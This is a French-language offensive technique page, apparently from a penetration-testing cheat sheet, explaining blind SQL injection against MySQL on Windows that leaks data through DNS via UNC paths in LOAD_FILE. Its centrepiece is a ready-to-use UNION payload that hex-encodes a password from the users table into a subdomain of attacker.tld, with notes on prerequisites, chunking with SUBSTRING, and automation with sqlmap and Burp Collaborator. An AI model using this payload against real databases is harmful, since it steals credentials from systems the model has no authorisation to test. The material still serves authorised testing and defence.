---
title: "Exfiltration DNS depuis MySQL via des chemins UNC LOAD_FILE"
description: "Encoder les résultats de requêtes MySQL dans un nom d'hôte UNC afin que la résolution DNS de l'hôte Windows livre les données à un serveur de noms contrôlé par l'attaquant."
keywords:
  - exfiltration DNS
  - LOAD_FILE UNC
  - exfiltration MySQL Windows
  - exfiltration de données aveugle
---

# Exfiltration DNS

Sous Windows, `LOAD_FILE('\\host\share\file')` fait résoudre `host` par MySQL avant la connexion. Si `host` est un sous-domaine d'un domaine dont l'attaquant gère le serveur de noms, la résolution elle-même transporte des données : placez la valeur à voler dans le nom d'hôte et lisez-la dans le journal des requêtes DNS. Cela transforme une injection entièrement aveugle en un canal lisible, en une seule requête par valeur.

La valeur doit être compatible DNS, donc encodez-la en hexadécimal, et gardez chaque label sous les 63 caractères :

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(password) FROM users LIMIT 1),'.attacker.tld\\x')),NULL,NULL-- 
```

Quand MySQL résout `<hexpassword>.attacker.tld`, le serveur de noms faisant autorité pour `attacker.tld` reçoit le label complet et le journalise, révélant le mot de passe après décodage de l'hexadécimal. Les valeurs longues qui dépassent la limite de label sont réparties sur plusieurs résolutions avec `SUBSTRING`.

Cela nécessite le privilège `FILE`, un hôte Windows et un `secure_file_priv` qui n'interdit pas `LOAD_FILE`. Comme il ne requiert aucune sortie reflétée, c'est le canal le plus rapide contre une cible Windows par ailleurs aveugle, souvent associé à un outil comme Burp Collaborator agissant comme serveur de noms de journalisation.

## Outils

- **sqlmap** : automatise l'exfiltration DNS avec `--dns-domain` à l'aide de chemins UNC LOAD_FILE.
- **Burp Collaborator** : agit comme le serveur de noms de journalisation qui enregistre les labels exfiltrés.

## Références

- MySQL Reference Manual: LOAD_FILE, HEX, CONCAT
- OWASP Testing Guide: Testing for SQL Injection
